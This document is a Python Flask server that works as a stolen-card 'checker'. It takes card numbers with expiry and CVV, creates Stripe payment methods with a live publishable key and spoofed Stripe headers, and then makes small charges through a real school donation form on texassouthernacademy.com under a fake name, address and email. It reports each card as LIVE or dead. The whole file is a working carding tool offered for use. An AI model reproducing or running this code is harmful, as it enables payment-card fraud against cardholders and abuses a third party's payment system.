from flask import Flask, request, jsonify
import requests
import random

app = Flask(__name__)

@app.route('/api/check', methods=['POST'])
def check_card():
    """
    Simple card checker API
    Expects: {"card": "number|mm|yy|cvv"}
    """
    try:
        data = request.json
        
        if 'card' not in data:
            return jsonify({
                'success': False,
                'message': 'Missing card parameter'
            }), 400
        
        # Parse card
        ccx = data['card'].strip()
        parts = ccx.split("|")
        
        if len(parts) != 4:
            return jsonify({
                'success': False,
                'message': 'Invalid format. Use: number|mm|yy|cvv'
            }), 400
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        # Convert year
        if "20" in yy:
            yy = yy.split("20")[1]
        
        # Random amount
        random_amount1 = random.randint(1, 4)
        random_amount2 = random.randint(1, 99)
        
        # Step 1: Create Stripe payment method
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        stripe_data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key=pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'
        
        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=stripe_data,
            timeout=15
        )
        
        if stripe_response.status_code != 200:
            stripe_error = stripe_response.json()
            return jsonify({
                'success': False,
                'status': 'declined',
                'message': stripe_error.get('error', {}).get('message', 'Card declined'),
                'card': f"************{n[-4:]}",
                'result': 'DEAD'
            }), 200
        
        pm = stripe_response.json()['id']
        
        # Step 2: Charge card
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://texassouthernacademy.com',
            'referer': 'https://texassouthernacademy.com/donation/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        charge_data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'donate',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.50',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-billing-name': 'Waiyan',
            'wpfs-billing-address-country': 'US',
            'wpfs-billing-address-line-1': '7246 Royal Ln',
            'wpfs-billing-address-line-2': '',
            'wpfs-billing-address-city': 'Bellevue',
            'wpfs-billing-address-state': '',
            'wpfs-billing-address-state-select': 'NY',
            'wpfs-billing-address-zip': '10080',
            'wpfs-card-holder-email': f'Waiyan{random_amount1}{random_amount2}@gmail.com',
            'wpfs-card-holder-name': 'Waiyan',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }
        
        charge_response = requests.post(
            'https://texassouthernacademy.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=charge_data,
            timeout=15
        )
        
        result = charge_response.json()
        message = result.get('message', '')
        
        # Check result
        if 'success' in result and result['success']:
            return jsonify({
                'success': True,
                'status': 'charged',
                'message': message,
                'card': f"************{n[-4:]}",
                'result': 'LIVE'
            }), 200
        else:
            return jsonify({
                'success': False,
                'status': 'declined',
                'message': message,
                'card': f"************{n[-4:]}",
                'result': 'DECLINED'
            }), 200
        
    except Exception as e:
        return jsonify({
            'success': False,
            'status': 'error',
            'message': str(e)
        }), 500


@app.route('/api/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({'status': 'online'})


if __name__ == '__main__':
    print("="*50)
    print("🚀 Stripe Checker API - Texas Southern")
    print("="*50)
    print("📍 Server: http://localhost:5000")
    print("📊 Endpoint: POST /api/check")
    print("="*50)
    app.run(debug=True, host='0.0.0.0', port=5000)
